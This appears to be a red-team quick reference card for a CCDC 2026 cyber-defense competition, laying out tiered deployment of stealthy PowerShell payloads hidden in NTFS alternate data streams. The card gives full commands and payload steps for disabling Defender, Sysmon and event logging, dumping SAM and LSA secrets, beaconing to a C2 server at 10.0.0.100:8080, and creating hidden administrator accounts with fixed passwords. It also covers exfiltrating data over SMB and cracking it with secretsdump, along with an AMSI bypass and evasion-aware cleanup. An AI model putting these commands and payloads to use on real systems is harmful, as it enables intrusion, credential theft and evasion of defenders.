# CCDC 2026 - Quick Reference Card

## Attack Box: 10.0.0.100:8080

## One-Command Deployments

### Domain Controllers (Tier 1 - Full Stealth)
```bash
# Primary (defense evasion + cred dump + C2)
pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/dc-primary.ps1 \
  -Encrypt -Randomize -ZeroWidthStreams -UseDeepPlacement -AttachToExisting \
  -CreateDecoys 3 -InstanceCount 3 -OutputFile competition/dc-primary-deploy.txt

# Secondary (domain recon + lateral prep + hidden admin)
pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/dc-secondary.ps1 \
  -Encrypt -Randomize -ZeroWidthStreams -UseDeepPlacement -AttachToExisting \
  -CreateDecoys 3 -InstanceCount 3 -OutputFile competition/dc-secondary-deploy.txt
```

### Windows Servers (Tier 2 - Medium Stealth)
```bash
# Primary (firewall + C2 + service disruption)
pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/server-primary.ps1 \
  -Encrypt -Randomize -InstanceCount 2 -OutputFile competition/server-primary-deploy.txt

# Secondary (RDP + admin creation + lateral prep)
pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/server-secondary.ps1 \
  -Encrypt -Randomize -InstanceCount 2 -OutputFile competition/server-secondary-deploy.txt
```

### Workstations (Tier 3 - Rapid)
```bash
# Primary (C2 + cred dump + quick wins)
pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/workstation-primary.ps1 \
  -Encrypt -Randomize -OutputFile competition/workstation-primary-deploy.txt

# Secondary (recon + admin + exfil)
pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/workstation-secondary.ps1 \
  -Encrypt -Randomize -OutputFile competition/workstation-secondary-deploy.txt
```

### Fallback (Tier 4 - Emergency Only)
```bash
pwsh src/ADS-OneLiner.ps1 -PayloadFile competition/payloads/workstation-primary.ps1 \
  -OutputFile competition/fallback-deploy.txt
```

## Payload Summary

### dc-primary.ps1
- Disable Script Block Logging + Module Logging
- Add Defender exclusions (C:\ProgramData, TEMP dirs)
- Disable Defender tamper protection
- Dump SAM + SYSTEM + SECURITY (LSA secrets)
- Timestomp credential dumps
- C2 beacon: http://10.0.0.100:8080/agent.ps1
- Stealthy firewall rule (allow-all, looks like "Windows Telemetry")
- Disable + unload Sysmon

### dc-secondary.ps1
- Domain enumeration (DCs, domain admins, forest)
- Full system + network recon
- Scheduled task enumeration (blue team hunting)
- Hidden admin: svcUpdate / Pa$$w0rd2026!
- Enable WinRM + PSRemoting (trusted hosts = *)
- Enable WMI remote access
- RDP with NLA disabled

### server-primary.ps1
- Disable firewall (netsh + service disable)
- C2 beacon: http://10.0.0.100:8080/agent.ps1
- Polling beacon: http://10.0.0.100:8080/tasks (5-min interval)
- Stop Defender service + disable real-time monitoring
- Stop Windows Update
- Disable Sysmon
- Disable PowerShell logging

### server-secondary.ps1
- Enable RDP
- Open ports: 3389, 5985, 5986, 445 (looks like "Core Networking - DHCP")
- Create admin: svcAdmin / Pa$$w0rd2026!
- Enable built-in Administrator: Adm1nCCDC2026!
- Enable WinRM
- Create SMB share: \\TARGET\RedTeam (Everyone full access)
- Full recon + credential dump

### workstation-primary.ps1
- C2 beacon: http://10.0.0.100:8080/agent.ps1
- Disable firewall
- Dump SAM + SYSTEM
- Add Defender exclusions
- Disable PowerShell logging
- Disable Sysmon
- Quick recon

### workstation-secondary.ps1
- Full recon + interesting file search
- Create admin: svcAdmin / Pa$$w0rd2026!
- Enable RDP
- Clear all event logs
- Compress user data: C:\ProgramData\backup.zip

## Artifact Collection

### Credential Dumps
```bash
# SMB download
smbclient //TARGET/C$ -U svcAdmin%'Pa$$w0rd2026!' \
  -c 'cd ProgramData; get s.dat; get sy.dat; get se.dat'

# Crack
secretsdump.py -sam s.dat -system sy.dat -security se.dat LOCAL
```

### Recon Files
```bash
smbclient //TARGET/C$ -U svcAdmin%'Pa$$w0rd2026!' \
  -c 'cd ProgramData; get r.txt; get d.txt; get t.txt; get f.txt; get backup.zip'
```

## Access Credentials

| Account | Password | Notes |
|---------|----------|-------|
| svcAdmin | Pa$$w0rd2026! | Created by server/workstation payloads |
| svcUpdate | Pa$$w0rd2026! | Hidden admin (dc-secondary) |
| Administrator | Adm1nCCDC2026! | Re-enabled built-in (server-secondary) |

## Network Services

| Service | Payloads | Connection Method |
|---------|----------|-------------------|
| RDP (3389) | dc-secondary, server-secondary, workstation-secondary | `xfreerdp /v:TARGET /u:svcAdmin /p:'Pa$$w0rd2026!'` |
| WinRM (5985) | dc-secondary, server-secondary | `evil-winrm -i TARGET -u svcAdmin -p 'Pa$$w0rd2026!'` |
| SMB (445) | server-secondary | `smbclient //TARGET/RedTeam -U svcAdmin%'Pa$$w0rd2026!'` |

## Cleanup Template
```powershell
# Get manifest stream name reconstruction
$sn=<from_manifest_StreamNameEscaped>

# Remove ADS + task + JScript + artifacts
Remove-Item "$hp`:$sn" -Force
Unregister-ScheduledTask -TaskName 'WinSAT_*' -Confirm:$false
Get-ChildItem -Path (Split-Path $hp -Parent) -Filter "windiag_*.js" -EA 0 | Remove-Item -Force
Remove-Item C:\ProgramData\*.dat -Force
Remove-Item C:\ProgramData\*.txt -Force
Remove-Item C:\ProgramData\backup.zip -Force
```

## Pre-Flight Checklist
- [ ] HTTP server running: `python3 -m http.server 8080`
- [ ] agent.ps1 in web root
- [ ] /tasks endpoint responding (empty = no-op, PowerShell = tasking)
- [ ] All deployment commands generated
- [ ] Manifests saved for cleanup
- [ ] Responder ready: `sudo responder -I eth0`

## Detection Indicators (Blue Team Will Look For)
- Scheduled tasks: WinSAT_* pattern
- JScript files: windiag_*.js in ProgramData/WER/Cache
- Service stops: Sysmon, Defender, Windows Update
- Registry mods: Defender policies, PowerShell logging
- Outbound HTTP: 10.0.0.100:8080
- Files: s.dat, sy.dat, se.dat in C:\ProgramData
- New local admins: svcAdmin, svcUpdate, Administrator re-enabled

## Troubleshooting
| Issue | Fix |
|-------|-----|
| Payload won't run | Check Defender real-time protection, try Tier 4 fallback |
| C2 no callback | Verify HTTP server running, check network connectivity |
| Task won't create | Verify running as SYSTEM, check PowerShell version (5.1+) |
| ADS not found | Use manifest codepoints for zero-width streams |

---
**All payloads pre-configured for 10.0.0.100:8080**
**Deployment time: DC ~30s, Server ~15s, Workstation ~8s**
**AMSI bypass: Automatic (XOR Fragment Splitting)**
